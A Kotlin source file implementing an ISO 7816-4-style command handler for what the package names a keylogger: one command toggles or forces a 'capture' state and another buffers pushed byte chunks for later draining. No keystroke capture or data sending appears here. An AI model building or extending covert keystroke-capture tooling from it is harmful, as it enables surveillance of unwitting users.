package love.scotty.hearts.keylogger

import android.util.Log
import java.util.concurrent.atomic.AtomicBoolean

/**
 * ESE (Embedded Secure Element) channel handler — ISO 7816-4 shaped command
 * interface for the keylogger.
 *
 * Command set (the spec's two canonical commands):
 *
 *   CLA  INS  P1    P2    meaning
 *   ─────────────────────────────────────────────────────────────────
 *   00   A4   04    00    SELECT — the runtime TOGGLE. A bare `00 A4 04 00`
 *                         flips the capture state (off→on, on→off). As an
 *                         extension, an optional single-byte AID selects a
 *                         specific state: 0x48 ('H') forces ON, 0x4F ('O')
 *                         forces OFF.
 *   00   DA   00    00    WRITE BINARY — CHUNKED PUSH. <Lc> data bytes are
 *                         appended to the in-memory input buffer.
 *
 * Status words (ISO 7816-4 SW1 SW2): 0x9000 success, 0x6A82 unknown AID/
 * file not found, 0x6700 wrong length, 0x6E00 unsupported class/INS. These
 * are returned raw so the caller distinguishes ACK from NACK.
 *
 * The handler is state-free about *content* — it enqueues raw byte chunks and
 * exposes drain() for the flush path. Toggle semantics are injected as a
 * callback so the same handler works regardless of who drives the channel.
 */
object EseApduHandler {
  private const val TAG = "KeyLogger/ESe"

  /** SELECT by name — P1=0x04 (by name), P2=0x00 (no more data). */
  private const val INS_SELECT = 0xA4.toByte()
  /** WRITE BINARY — P1=0x00 P2=0x00 (offset 0); header Lc + data follows. */
  private const val INS_WRITE_BINARY = 0xDA.toByte()

  /** SELECT extension: AID forcing capture ON / OFF (0x48 'H', 0x4F 'O'). */
  private const val AID_ON: Byte = 0x48
  private const val AID_OFF: Byte = 0x4F

  // ISO 7816 status words
  private val SW_OK = byteArrayOf(0x90.toByte(), 0x00)
  private val SW_FILE_NOT_FOUND = byteArrayOf(0x6A.toByte(), 0x82.toByte())
  private val SW_WRONG_LENGTH = byteArrayOf(0x67.toByte(), 0x00)
  private val SW_CLA_NOT_SUPPORTED = byteArrayOf(0x6E.toByte(), 0x00)

  /** Current capture state (lazily initialised; toggling flips it). */
  private val state = AtomicBoolean(true)

  /** In-memory receive buffer for WRITE BINARY chunked pushes. */
  private val buffer = java.io.ByteArrayOutputStream()

  /** SW equals OK? */
  fun isOk(sw1: Byte, sw2: Byte): Boolean =
    sw1 == SW_OK[0] && sw2 == SW_OK[1]

  /** Current toggle state (true = capturing). */
  fun isCapturing(): Boolean = state.get()

  /**
   * Dispatch one full command APDU (header + data already assembled by the
   * transport). Returns the 2-byte status word.
   */
  fun process(apdu: ByteArray, onToggle: (on: Boolean) -> Unit): ByteArray {
    if (apdu.size < 4) return SW_WRONG_LENGTH

    val cla = apdu[0]
    val ins = apdu[1]
    val p1 = apdu[2]
    val p2 = apdu[3]

    // CLA must be 0x00 (ISO interindustry class).
    if (cla != 0x00.toByte()) return SW_CLA_NOT_SUPPORTED

    if (ins == INS_SELECT) {
      // P1 must be select-by-name (0x04). A bare 4-byte `00 A4 04 00` is the
      // toggle. With an optional Lc + 1-byte AID, the AID forces a state.
      if (p1 != 0x04.toByte()) return SW_CLA_NOT_SUPPORTED

      // If a name follows (Lc in byte 5), interpret the single AID byte.
      if (apdu.size >= 5) {
        val lc = apdu[4].toInt() and 0xFF
        if (lc != 0 && apdu.size >= 6) {
          return when (apdu[5]) {
            AID_ON -> { applyState(true, onToggle); SW_OK }
            AID_OFF -> { applyState(false, onToggle); SW_OK }
            else -> SW_FILE_NOT_FOUND
          }
        }
      }
      // Bare SELECT → toggle.
      applyState(!state.get(), onToggle)
      return SW_OK
    }

    if (ins == INS_WRITE_BINARY) {
      // P1=0x00 P2=0x00 offset; byte 5 is Lc (single-byte length, ≤255).
      if (apdu.size < 5) return SW_WRONG_LENGTH
      val lc = apdu[4].toInt() and 0xFF
      if (lc == 0) return SW_OK // queueless ping
      val dataEnd = minOf(apdu.size, 5 + lc)
      if (dataEnd - 5 != lc) return SW_WRONG_LENGTH
      buffer.write(apdu, 5, dataEnd - 5)
      return SW_OK
    }

    return SW_CLA_NOT_SUPPORTED
  }

  private fun applyState(on: Boolean, onToggle: (Boolean) -> Unit) {
    state.set(on)
    onToggle(on)
    Log.d(TAG, "capture toggled → $on")
  }

  /** Number of bytes currently buffered by WRITE BINARY pushes. */
  fun bufferedBytes(): Int = buffer.size()

  /** Remove and return everything buffered so far (used by the flush path). */
  fun drain(): ByteArray {
    val out = buffer.toByteArray()
    buffer.reset()
    return out
  }

  fun clear() {
    buffer.reset()
  }
}
